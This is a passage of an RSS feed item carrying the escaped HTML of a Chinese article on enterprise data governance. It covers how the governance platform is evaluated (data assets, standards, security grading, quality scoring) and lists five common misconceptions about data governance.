data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/icgPoXwUicOgU20v7jWoQPjwYWQkXqMSgN4GvUC4OrUtVQIOcyoFsDicMokkFLCGIljCuiczK4YEo77rtGNO24SSdg/640?wx_fmt=png&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;5）数据安全&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;基于集团数据资产实现数据安全分级管理，自动识别安全信息；提供数据访问安全行为监测，及时识别访问风险。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.4506089309878214&quot; data-type=&quot;png&quot; data-w=&quot;739&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/icgPoXwUicOgU20v7jWoQPjwYWQkXqMSgNIrbkmzCNwAmibVvC7Pic9jN2VUqLRCq45czLZ500fr0d9EHHA9qFTmeQ/640?wx_fmt=png&quot;/&gt;&lt;/figure&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;4.4 数据治理评估&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;数据治理平台开发完成并运行，需要对整体数据治理体系的效果进行验证和评估。&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;“&lt;/span&gt;&lt;p&gt;1）数据是否可以消除&quot;脏、乱、差&quot;的现象&lt;br/&gt;2）数据资产是否最大价值化&lt;br/&gt;3）所有数据的血缘是否完整可追溯。。。&lt;/p&gt;&lt;span&gt;”&lt;/span&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;1）数据资产&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;通过构建数据资产管理体系，实现资产全覆盖，并支持全局搜索和精准定位目标资产。&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;实现全局搜索，面向用户提供场景化检索服务&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;支持标签、数据地图、表名和字段名等多种检索维度&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;支持进行数据地图，源业务数据字典的结果筛选&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;比如支持PV/UV用户搜索和资产展示，明确服务目标&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.7063197026022305&quot; data-type=&quot;png&quot; data-w=&quot;807&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/icgPoXwUicOgU20v7jWoQPjwYWQkXqMSgNeUMoF1JGQniah0c4PwtQYg3YybyZdIt3CxAf8Wnlm6QFr2sdJ1AgFBg/640?wx_fmt=png&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;2）数据标准&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;新旧数据标准沉淀，打通了数据建模工具、数据标准库和词根标准库，落地数据标准和词根。&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;实现数据标准库100%拉通&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;智能识别数据标准和引用&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;客户端同步更新数据标准、词根&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.28774928774928776&quot; data-type=&quot;png&quot; data-w=&quot;1053&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/icgPoXwUicOgU20v7jWoQPjwYWQkXqMSgNnt9nLicgYLCKbEwSqVzTEuJrdNpHMuVvkeht9rFQ2bqAR31j00Y6fmg/640?wx_fmt=png&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;3）数据安全&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;保持&lt;code&gt;事前制度建设&lt;/code&gt;、&lt;code&gt;事中技术管控&lt;/code&gt;、&lt;code&gt;事后监控审计&lt;/code&gt;的原则建立全流程数据安全管控体系。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;基于以上数据安全管控体系，支持数据安全定级，构建灵活的数据安全共享流程。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.34267515923566877&quot; data-type=&quot;png&quot; data-w=&quot;785&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/icgPoXwUicOgU20v7jWoQPjwYWQkXqMSgNnBvX01pBxADJaPAAr2CesP6JoqePrWiaEXia09gAbiaiaHwNaNPdffpAlw/640?wx_fmt=png&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;4）数据质量&lt;/strong&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;通过数据质量雷达图，定期进行数据和任务质量打分，综合考察数据质量效果。&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;数据完整性：查看数据项信息是否全面、完整无缺失&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;告警响应程度：日常管理、应急响应、降低影响；避免数据损毁和丢失&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;监控覆盖程度：确保数据遵循统一的数据标准和规范要求&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;作业稳定性：监控作业稳定性，是否存在作业异常等问题&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;作业时效性：检查任务对应的数据项信息获取是否满足预期要求&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.8035087719298246&quot; data-type=&quot;png&quot; data-w=&quot;855&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/icgPoXwUicOgU20v7jWoQPjwYWQkXqMSgN0HqQP0Mbt6gvu9I0IIZ2pzmAnUaYmfNT1GCmC63JUMKJq5iaDfaUvDQ/640?wx_fmt=png&quot;/&gt;&lt;/figure&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;5 数据治理的几点误区&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;1）数据治理是否要做得大而全&lt;/strong&gt;&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;“&lt;/span&gt;&lt;p&gt;这是一个经典问题，一般对于不同阶段和规模的企业，数据治理的实施程度会有所不同。一般建议先根据自身的数据状况分阶段进行，避免盲目铺开规模，过程中可调整。&lt;/p&gt;&lt;span&gt;”&lt;/span&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;2）数据治理只是技术考虑的事情&lt;/strong&gt;&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;“&lt;/span&gt;&lt;p&gt;正如文中所说，数据治理不仅仅是技术团队的事情，而是整个集团一起协作完成。其中就包括各业务线以及其他管理组织，没有一个好的实施方案和协作机制，往往事倍功半。&lt;/p&gt;&lt;span&gt;”&lt;/span&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;3）数据治理可以短期见效&lt;/strong&gt;&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;“&lt;/span&gt;&lt;p&gt;数据治理是个长期过程，会跟随着企业数据的规模和数仓规划的变更同步调整，部分功能可能会在短期内卓有成效，完整体系搭建短期很难实现。&lt;/p&gt;&lt;span&gt;”&lt;/span&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;4）必须得有工具平台，才能开展数据治理&lt;/strong&gt;&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;“&lt;/span&gt;&lt;p&gt;俗话说工欲善其事必先利其器，有好的工具当然是更好，前提是已经有了成熟的数据治理体系规划和策略。工具和技术手段目前市面上很成熟，先把理论给铺垫好。&lt;/p&gt;&lt;span&gt;”&lt;/span&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;strong&gt;5）数据治理感觉很模糊？不知道最后的落地结果&lt;/strong&gt;&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;“&lt;/span&gt;&lt;p&gt;数据治理是一个长期工作，需要相关从业者根据企业的数据现状和管理模式去构建和调整，建议边做实践边总结归纳，小步慢跑是一个很好的方式。&lt;/p&gt;&lt;span&gt;”&lt;/span&gt;&lt;/blockquote&gt;&lt;/section&gt;&lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
</channel></rss>